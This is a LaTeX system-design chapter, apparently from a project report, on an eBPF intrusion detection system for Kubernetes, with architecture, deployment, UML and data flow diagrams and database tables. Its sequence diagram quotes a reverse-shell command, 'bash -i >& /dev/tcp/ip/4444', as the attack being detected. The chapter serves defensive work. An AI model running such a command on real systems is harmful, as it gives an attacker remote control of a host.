\chapter{System Design}

System design describes the structure of the system, the interaction between its
components and the movement of data between them. This chapter presents the overall
architecture, the Kubernetes deployment, UML diagrams (use case, class and sequence),
data flow diagrams and the database design.

\section{System Architecture}

Figure~\ref{fig:architecture} shows the architecture. Each Kubernetes node runs one
privileged \textbf{agent} pod (DaemonSet) that contains the eBPF sensor and the Python
detection pipeline. The agent sends events, alerts, heartbeats and evaluation reports
to the \textbf{FastAPI backend}, which stores them in \textbf{MongoDB}. The \textbf{React
dashboard} reads them through the backend's REST API. All IDS components run in the
dedicated namespace \texttt{ebpf-ids}.

\begin{figure}[H]
\centering
\resizebox{\textwidth}{!}{%
\begin{tikzpicture}[node distance=0.5cm and 0.6cm]
  % node
  \node[box, minimum width=2.4cm, fill=gray!8] (p1) {Pod\\ \scriptsize shop-web};
  \node[box, minimum width=2.4cm, fill=gray!8, below=0.3cm of p1] (p2) {Pod\\ \scriptsize coredns, ...};
  \node[kbox, minimum width=2.6cm, right=1.6cm of $(p1)!0.5!(p2)$] (kern) {Linux kernel\\ \scriptsize 16 tracepoints\\ \scriptsize eBPF program};
  \node[ubox, minimum width=3.0cm, right=0.9cm of kern] (agent) {ids-agent\\ \scriptsize loader + Python\\ \scriptsize enrich, features,\\ \scriptsize RF + rules};
  \begin{scope}[on background layer]
    \node[draw, rounded corners, dashed, fill=gray!3, fit=(p1)(p2)(kern)(agent), inner sep=8pt,
          label={[font=\small\bfseries]above:Kubernetes node (minikube)}] (node) {};
  \end{scope}
  \draw[arr] (p1.east) -- (kern.west);
  \draw[arr] (p2.east) -- node[lbl, below, pos=0.4]{syscalls} (kern.west);
  \draw[arr] (kern) -- node[lbl, above]{ring buf} (agent);

  % control plane
  \node[box, fill=gray!8, above=1.3cm of agent] (api) {Kubernetes API\\ \scriptsize Pod metadata};
  \draw[darr] (api) -- node[lbl, right]{pods (RBAC)} (agent);

  % backend
  \node[dbox, minimum width=2.8cm, right=2.4cm of agent] (be) {FastAPI backend\\ \scriptsize ingest, REST API\\ \scriptsize JWT, agent token};
  \node[db, below=1.0cm of be] (mongo) {MongoDB\\ \scriptsize events, alerts,\\ \scriptsize metrics, users};
  \node[dbox, minimum width=2.8cm, above=1.0cm of be] (fe) {React dashboard\\ \scriptsize nginx, NodePort\\ \scriptsize 30080};
  \node[box, fill=gray!8, right=1.4cm of fe] (user) {Security\\ admin};

  \draw[arr] (agent) -- node[lbl, above]{HTTPS/JSON} node[lbl, below]{events, alerts} (be);
  \draw[arr, <->] (be) -- (mongo);
  \draw[arr, <->] (fe) -- node[lbl, right]{/api} (be);
  \draw[arr, <->] (user) -- node[lbl, above]{browser} (fe);
  \begin{scope}[on background layer]
    \node[draw, rounded corners, dotted, fill=green!2, fit=(be)(mongo)(fe), inner sep=7pt,
          label={[font=\scriptsize\itshape]below:namespace ebpf-ids}] {};
  \end{scope}
\end{tikzpicture}}
\caption{System architecture}
\label{fig:architecture}
\end{figure}

\section{Deployment Design}

The system is deployed with plain Kubernetes manifests (\texttt{infra/k8s/}) and one
script (\texttt{scripts/deploy\_minikube.sh}). Table~\ref{tab:k8sobjects} lists the
Kubernetes objects. The agent needs \texttt{hostPID} and \texttt{privileged} mode to load
eBPF programs and read every process on the node; it is limited by resource requests
(50m CPU, 192 MiB) and limits (1 CPU, 512 MiB), and its service account can only
\emph{get, list} and \emph{watch} pods. Credentials (MongoDB password, JWT secret, agent
token, admin password) are generated randomly at deployment time and stored in the
Kubernetes Secret \texttt{ids-secrets}.

\begin{table}[H]
\centering
\caption{Kubernetes objects of the deployment}
\label{tab:k8sobjects}
\small
\begin{tabularx}{\textwidth}{>{\raggedright\arraybackslash}p{4.4cm} l >{\raggedright\arraybackslash}X}
\toprule
\textbf{Object} & \textbf{Name} & \textbf{Purpose} \\
\midrule
Namespace & ebpf-ids & Isolates all IDS components \\
DaemonSet & ids-agent & One eBPF sensor + detector per node \\
ServiceAccount, ClusterRole, Binding & ids-agent & Read-only access to pods \\
Deployment + Service & ids-backend & FastAPI REST API (port 8000) \\
Deployment + Service & ids-frontend & React dashboard (NodePort 30080) \\
Deployment + Service + PVC & ids-mongodb & MongoDB 7.0 with persistent volume \\
Secret & ids-secrets & Random credentials and tokens \\
Deployment (test) & ids-demo/shop-web & Victim workload for evaluation \\
\bottomrule
\end{tabularx}
\end{table}

\section{UML Diagrams}

\subsection{Use Case Diagram}

Figure~\ref{fig:usecase} shows the actors and use cases. The \emph{security
administrator} uses the dashboard and the evaluation script. The \emph{eBPF agent} is a
system actor that monitors workloads and reports to the backend. A \emph{workload
process} (possibly controlled by an attacker) triggers kernel events without knowing it
is observed.

\begin{figure}[H]
\centering
\resizebox{0.95\textwidth}{!}{%
\begin{tikzpicture}[uc/.style={draw, ellipse, align=center, font=\small, minimum width=3.6cm, minimum height=0.8cm, fill=blue!4},
                    actor/.style={align=center, font=\small}]
  \newcommand{\stick}[2]{%
    \begin{scope}[shift={#1}]
      \draw[thick] (0,0.55) circle (0.18);
      \draw[thick] (0,0.37) -- (0,-0.15);
      \draw[thick] (-0.3,0.2) -- (0.3,0.2);
      \draw[thick] (0,-0.15) -- (-0.25,-0.55);
      \draw[thick] (0,-0.15) -- (0.25,-0.55);
      \node[actor] at (0,-0.85) {#2};
    \end{scope}}
  \node[draw, thick, minimum width=7.4cm, minimum height=11.2cm, label={[font=\bfseries]above:eBPF IDS}] (sys) at (0,0) {};
  \node[uc] (u1) at (0,4.8) {Log in};
  \node[uc] (u2) at (0,3.7) {View security overview};
  \node[uc] (u3) at (0,2.6) {Search and filter alerts};
  \node[uc] (u4) at (0,1.5) {Acknowledge / resolve alert};
  \node[uc] (u5) at (0,0.4) {Browse runtime events};
  \node[uc] (u6) at (0,-0.7) {View evaluation results};
  \node[uc] (u7) at (0,-1.8) {Run attack simulation};
  \node[uc] (u8) at (0,-2.9) {Capture kernel events};
  \node[uc] (u9) at (0,-4.0) {Detect, score and report};
  \node[uc] (u10) at (0,-5.1) {Send heartbeat metrics};

  \stick{(-6.6,1.5)}{Security\\administrator}
  \stick{(6.6,-4.0)}{eBPF agent\\(system)}
  \stick{(6.6,1.5)}{Workload\\process /\\attacker}

  \foreach \u in {u1,u2,u3,u4,u5,u6,u7} \draw (-6.2,1.5) -- (\u.west);
  \foreach \u in {u8,u9,u10} \draw (6.2,-4.0) -- (\u.east);
  \draw[dashed] (6.2,1.5) -- node[lbl, sloped, above, pos=0.35]{triggers} (u8.east);
  \draw[darr] (u3.south) to[bend left=35] node[lbl, right]{\scriptsize $\ll$extend$\gg$} (u4.north);
\end{tikzpicture}}
\caption{Use case diagram}
\label{fig:usecase}
\end{figure}

\subsection{Class Diagram}

Figure~\ref{fig:class} shows the main classes of the agent and the documents stored by
the backend. The \texttt{Agent} orchestrates a \texttt{Collector} (reads the loader's
JSON stream), a \texttt{K8sEnricher} (with \texttt{CgroupResolver} and
\texttt{KubeClient}), a \texttt{BehaviorTracker}, the \texttt{Detector} (Random Forest
and rules), a \texttt{Shipper} (batched HTTP delivery) and \texttt{Metrics} (CPU, memory,
latency, drops).

\begin{figure}[H]
\centering
\resizebox{\textwidth}{!}{%
\begin{tikzpicture}[cls/.style={draw, rectangle split, rectangle split parts=3, align=left,
                    font=\scriptsize\ttfamily, fill=yellow!6, inner sep=3pt, text width=3.6cm},
                    node distance=0.7cm and 0.7cm]
  \node[cls] (agent) {\textbf{Agent}
    \nodepart{second} collector, enricher\\ tracker, detector\\ shipper, metrics
    \nodepart{third} process(batch)\\ run(), stop()};
  \node[cls, above left=0.6cm and 0.9cm of agent] (col) {\textbf{Collector}
    \nodepart{second} loader\_path\\ queue
    \nodepart{third} start(), stop()\\ drain(max, timeout)};
  \node[cls, above right=0.6cm and 0.9cm of agent] (enr) {\textbf{K8sEnricher}
    \nodepart{second} node, cgroups\\ kube, refresh
    \nodepart{third} refresh\_pods()\\ enrich(ev)};
  \node[cls, right=0.7cm of enr] (cg) {\textbf{CgroupResolver}
    \nodepart{second} root, proc\_root\\ paths
    \nodepart{third} resolve(cgroup\_id)};
  \node[cls, below=0.6cm of cg] (kc) {\textbf{KubeClient}
    \nodepart{second} base, session\\ enabled
    \nodepart{third} list\_pods(node)};
  \node[cls, left=0.9cm of agent] (bt) {\textbf{BehaviorTracker}
    \nodepart{second} window = 60 s\\ recent, baseline
    \nodepart{third} observe(key, wl, ev)\\ gc()};
  \node[cls, below left=0.8cm and -0.4cm of agent] (det) {\textbf{Detector}
    \nodepart{second} model: RandomForest\\ classes, threshold
    \nodepart{third} predict(X)\\ assess(ev, k8s, f, p, c)};
  \node[cls, below right=0.8cm and -0.4cm of agent] (sh) {\textbf{Shipper}
    \nodepart{second} base, node\\ session, failures
    \nodepart{third} enqueue(events, alerts)\\ post(path, payload)};
  \node[cls, below=0.6cm of det] (rule) {\textbf{Rule}
    \nodepart{second} id, name, severity\\ category, mitre
    \nodepart{third} test(ev, feats): bool};
  \node[cls, right=0.7cm of sh] (met) {\textbf{Metrics}
    \nodepart{second} processed, scored\\ raw, alerts
    \nodepart{third} record\_batch()\\ snapshot(pids)};
  \node[cls, below=0.6cm of sh, fill=green!6] (alert) {\textbf{Alert} (MongoDB)
    \nodepart{second} dedup\_key, severity\\ risk\_score, mitre\\ k8s, count, status
    \nodepart{third} acknowledge()\\ resolve()};
  \node[cls, right=0.7cm of alert, fill=green!6] (event) {\textbf{Event} (MongoDB)
    \nodepart{second} ts, event\_type\\ process, k8s\\ prediction
    \nodepart{third} (TTL 24 h)};

  \draw[-{Diamond[open]}, thick] (col) -- (agent);
  \draw[-{Diamond[open]}, thick] (enr) -- (agent);
  \draw[-{Diamond[open]}, thick] (bt) -- (agent);
  \draw[-{Diamond[open]}, thick] (det) -- (agent);
  \draw[-{Diamond[open]}, thick] (sh) -- (agent);
  \draw[-{Diamond[open]}, thick] (met.north) |- ($(agent.east)+(0,-0.6)$);
  \draw[-{Diamond[open]}, thick] (cg) -- (enr);
  \draw[-{Diamond[open]}, thick] (kc.west) -| ($(enr.south)+(0.8,0)$);
  \draw[thick] (det) -- node[lbl, right]{1..19} (rule);
  \draw[darr] (sh) -- node[lbl, right]{creates} (alert);
  \draw[darr] (sh.east) -| node[lbl, near end, right]{creates} (event.north);
\end{tikzpicture}}
\caption{Class diagram of the agent and stored documents}
\label{fig:class}
\end{figure}

\subsection{Sequence Diagram}

Figure~\ref{fig:sequence} shows the sequence of interactions when an attacker opens a
reverse shell inside a pod and the administrator investigates the alert.

\begin{figure}[H]
\centering
\resizebox{\textwidth}{!}{%
\begin{tikzpicture}[ll/.style={draw, fill=blue!6, font=\small, minimum width=2.1cm, minimum height=0.7cm, align=center},
                    msg/.style={-{Stealth[length=2mm]}, thick},
                    ret/.style={-{Stealth[length=2mm]}, dashed},
                    m/.style={font=\scriptsize, above}]
  \def\H{-11.6}
  \foreach \x/\n/\t in {0/a/Attacker\\(in pod), 2.7/k/Kernel +\\eBPF, 5.4/g/Agent, 8.1/b/Backend, 10.8/d/MongoDB, 13.5/u/Dashboard\\+ Admin} {
    \node[ll] (\n) at (\x,0) {\t};
    \draw[dashed, gray] (\x,-0.5) -- (\x,\H);
  }
  \draw[msg] (0,-1.35) -- node[m, font=\tiny]{bash -i \textgreater\& /dev/tcp/ip/4444} (2.7,-1.35);
  \draw[msg] (2.7,-1.95) -- node[m]{exec + connect events} (5.4,-1.95);
  \draw[msg] (5.4,-2.5) -- ++(0.6,0) -- node[m, right, xshift=1pt]{enrich (cgroup $\rightarrow$ Pod)} ++(0,-0.5) -- ++(-0.6,0);
  \draw[msg] (5.4,-3.5) -- ++(0.6,0) -- node[m, right, xshift=1pt]{features + window} ++(0,-0.5) -- ++(-0.6,0);
  \draw[msg] (5.4,-4.5) -- ++(0.6,0) -- node[m, right, xshift=1pt]{RF: P(mal)=0.98; rules R001, R002} ++(0,-0.5) -- ++(-0.6,0);
  \draw[msg] (5.4,-5.5) -- ++(0.6,0) -- node[m, right, xshift=1pt]{risk 95 $\rightarrow$ High, T1059.004} ++(0,-0.5) -- ++(-0.6,0);
  \draw[msg] (5.4,-6.6) -- node[m]{POST /api/ingest} (8.1,-6.6);
  \draw[msg] (8.1,-7.2) -- node[m]{insert events; upsert alert} (10.8,-7.2);
  \draw[ret] (10.8,-7.8) -- node[m]{ok} (8.1,-7.8);
  \draw[ret] (8.1,-8.3) -- node[m]{200 OK} (5.4,-8.3);
  \draw[msg] (13.5,-9.0) -- node[m]{GET /api/alerts (JWT)} (8.1,-9.0);
  \draw[msg] (8.1,-9.5) -- node[m]{query alerts} (10.8,-9.5);
  \draw[ret] (10.8,-10.0) -- node[m]{documents} (8.1,-10.0);
  \draw[ret] (8.1,-10.5) -- node[m]{alert list} (13.5,-10.5);
  \draw[msg] (13.5,-11.2) -- node[m]{PATCH status = resolved} (8.1,-11.2);
\end{tikzpicture}}
\caption{Sequence diagram: detection of a reverse shell}
\label{fig:sequence}
\end{figure}

\section{Data Flow Diagrams}

\subsection{Level 0 (Context Diagram)}

\begin{figure}[H]
\centering
\begin{tikzpicture}[ext/.style={draw, rectangle, font=\small, align=center, minimum width=2.6cm, minimum height=1cm, fill=gray!8},
                    proc/.style={draw, circle, font=\small, align=center, minimum size=2.9cm, fill=blue!6}]
  \node[proc] (p) at (0,0) {0.0\\ eBPF IDS};
  \node[ext] (w) at (-5,1.2) {Kubernetes\\ workloads};
  \node[ext] (k) at (-5,-1.2) {Kubernetes\\ API};
  \node[ext] (a) at (5,0) {Security\\ administrator};
  \draw[arr] (w) -- node[lbl, sloped, above]{kernel events} (p);
  \draw[arr] (k) -- node[lbl, sloped, below]{Pod metadata} (p);
  \draw[arr] ([yshift=0.3cm]p.east) -- node[lbl, above]{alerts, events, metrics} ([yshift=0.3cm]a.west);
  \draw[arr] ([yshift=-0.3cm]a.west) -- node[lbl, below]{login, filters, status} ([yshift=-0.3cm]p.east);
\end{tikzpicture}
\caption{Data flow diagram -- level 0}
\label{fig:dfd0}
\end{figure}

\subsection{Level 1}

\begin{figure}[H]
\centering
\resizebox{\textwidth}{!}{%
\begin{tikzpicture}[proc/.style={draw, circle, font=\scriptsize, align=center, minimum size=2.0cm, fill=blue!6},
                    store/.style={draw, font=\scriptsize, minimum width=2.4cm, minimum height=0.6cm, path picture={\draw (path picture bounding box.north west) -- (path picture bounding box.south west);}},
                    ext/.style={draw, rectangle, font=\scriptsize, align=center, minimum width=2.0cm, minimum height=0.9cm, fill=gray!8}]
  \node[ext] (w) at (0,0) {Workloads};
  \node[proc] (p1) at (3,0) {1.0\\ Capture\\ events};
  \node[proc] (p2) at (6,0) {2.0\\ Enrich\\ context};
  \node[proc] (p3) at (9,0) {3.0\\ Extract\\ features};
  \node[proc] (p4) at (12,0) {4.0\\ Detect \&\\ score};
  \node[proc] (p5) at (12,-3.4) {5.0\\ Store \&\\ de-duplicate};
  \node[proc] (p6) at (6,-3.4) {6.0\\ Serve API\\ \& dashboard};
  \node[ext] (k8s) at (6,2.4) {Kubernetes API};
  \node[store] (model) at (12,2.4) {D1 Model + rules};
  \node[store] (db) at (9,-5.4) {D2 MongoDB};
  \node[ext] (adm) at (2,-3.4) {Administrator};

  \draw[arr] (w) -- node[lbl, above]{syscalls} (p1);
  \draw[arr] (p1) -- node[lbl, above]{raw event} (p2);
  \draw[arr] (k8s) -- node[lbl, right]{pods} (p2);
  \draw[arr] (p2) -- node[lbl, above]{event+k8s} (p3);
  \draw[arr] (p3) -- node[lbl, above]{74 features} (p4);
  \draw[arr] (model) -- (p4);
  \draw[arr] (p4) -- node[lbl, right]{events, alerts} (p5);
  \draw[arr] (p5) |- (db);
  \draw[arr] (db) -| (p6);
  \draw[arr] ([yshift=0.25cm]p6.west) -- node[lbl, above]{views} ([yshift=0.25cm]adm.east);
  \draw[arr] ([yshift=-0.25cm]adm.east) -- node[lbl, below]{queries, status} ([yshift=-0.25cm]p6.west);
  \draw[arr] (p2.south) to[bend right=20] node[lbl, left]{raw (no pod)} (p5.west);
\end{tikzpicture}}
\caption{Data flow diagram -- level 1}
\label{fig:dfd1}
\end{figure}

\section{Database Design}

MongoDB stores five collections in the database \texttt{ebpf\_ids}
(Table~\ref{tab:collections}). Time-to-live (TTL) indexes delete old documents
automatically, and compound indexes support the dashboard's filters by namespace,
verdict, event type and severity.

\begin{table}[H]
\centering
\caption{MongoDB collections}
\label{tab:collections}
\small
\begin{tabularx}{\textwidth}{l >{\raggedright\arraybackslash}X >{\raggedright\arraybackslash}p{3.6cm}}
\toprule
\textbf{Collection} & \textbf{Main fields} & \textbf{Indexes} \\
\midrule
events & ts, event\_type, process (comm, parent, path, cmdline, uid), network (daddr, dport), k8s (namespace, pod, container, workload, node), prediction (label, probability, category) & TTL 24 h; namespace+ts; label+ts; type+ts \\
alerts & dedup\_key, title, category, severity, risk\_score, probability, rules, mitre, tactic, k8s, last\_event, count, status, first\_seen, last\_seen & TTL 30 days; dedup\_key+status; severity; namespace \\
metrics & node, cpu\_percent, rss\_mb, events\_per\_sec, latency avg / p95, kernel drops, ts & TTL 24 h; node+ts \\
evaluations & kind (offline / live), model\_version, report & -- \\
users & username, role, password\_hash (bcrypt) & unique username \\
\bottomrule
\end{tabularx}
\end{table}
